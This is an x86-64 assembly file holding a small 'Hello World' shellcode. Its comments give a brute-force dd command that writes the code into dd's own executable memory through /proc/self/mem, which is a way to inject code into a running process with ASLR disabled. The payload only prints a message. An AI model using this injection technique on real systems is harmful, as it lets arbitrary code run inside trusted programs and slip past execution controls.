        // run as: ./hello-with-dup.exe 33<&0 34>&1 1>/dev/null
        //
        // to find a location to inject into dd try the following command:
        //   for x in {4194304..4263936} ; do if ../dd if=hello-with-dup.bin of=/proc/self/mem bs=1 seek=${x} conv=notrunc status=none 33<&0 34>&1 2>/dev/null | grep Hello ; then echo $x ; break ; fi ; done
        // here the range needs to reflect the executable range from the /proc/self/map of dd (disable aslr)
        //
        // note, if libc 2.27 and python are available its easier to use ctypes
        .global _start
        .text
_start:
        call _a
_a:     pop rbx

        // int dup2(int oldfd, int newfd);
        mov eax, 0x21                   # rax = 33, dup2
        mov edi, eax                    # rdi = 33
        xor esi, esi                    # rsi = 0, stdin
        syscall                         # dup2(33,0)
        mov eax, edi
        inc edi                         # rdi = 34
        inc esi                         # rsi = 1, stdout
        syscall                         # dup2(34,1)

        // ssize_t write(int fd, const void *buf, size_t count);
                                        # rax = 1, write (output of last syscall)
        mov edi, eax                    # rdi = 1, stdout
        mov rsi, rbx
        add rsi, _msg - _a              # rsi = _msg
        mov edx, _msg_end - _msg        # rdx = len(_msg)
        syscall

        // exit(0)
        mov eax, 0x3c
        xor edi, edi
        syscall
   
_msg:   .ascii "Hello World\n"
_msg_end:       
